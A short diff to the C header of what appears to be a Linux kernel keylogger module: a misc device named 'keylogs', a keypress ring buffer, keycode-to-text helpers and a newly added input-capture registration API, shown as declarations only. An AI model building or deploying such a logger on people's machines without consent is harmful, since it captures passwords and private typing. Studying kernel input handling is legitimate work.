@@ -8,8 +8,13 @@
 #include <linux/kernel.h>
 #include <linux/input-event-codes.h>
 #include <linux/string.h>
+#include <linux/input.h>
+#include <linux/slab.h>
+#include <linux/timekeeping.h>
+#include <linux/time64.h>
 
-// ----- lk2_main.c ----- //
+
+// Main - Misc Device
 
 // Device node name created by lk2_main.c via miscdevice
 #define LK2_DEVICE_NAME "keylogs"
@@ -20,7 +25,7 @@ struct lk2_file_ctx
 	size_t len;
 };
 
-// ----- lk2_ring.c ----- //
+// Ring API
 
 // Tunables
 #define LK2_RING_SIZE 1024u	 // number of stored entries
@@ -53,6 +58,7 @@ struct lk2_ring
 };
 
 // Ring API
+
 void lk2_ring_init(struct lk2_ring *r);
 void lk2_ring_push(struct lk2_ring *r, const struct lk2_entry *e);
 u32 lk2_ring_count(struct lk2_ring *r);
@@ -73,5 +79,10 @@ size_t lk2_format_line(const struct lk2_entry *e, char *dst, size_t dst_len);
 const char *lk2_key_name(u16 keycode);
 // Returns a layout-dependent ASCII char (0 if none).
 char lk2_keycode_to_ascii(u16 keycode, bool shift_down);
+
+// Input capture API
+
+int lk2_input_register(void);
+void lk2_input_unregister(void);
 
 #endif // LK2_H
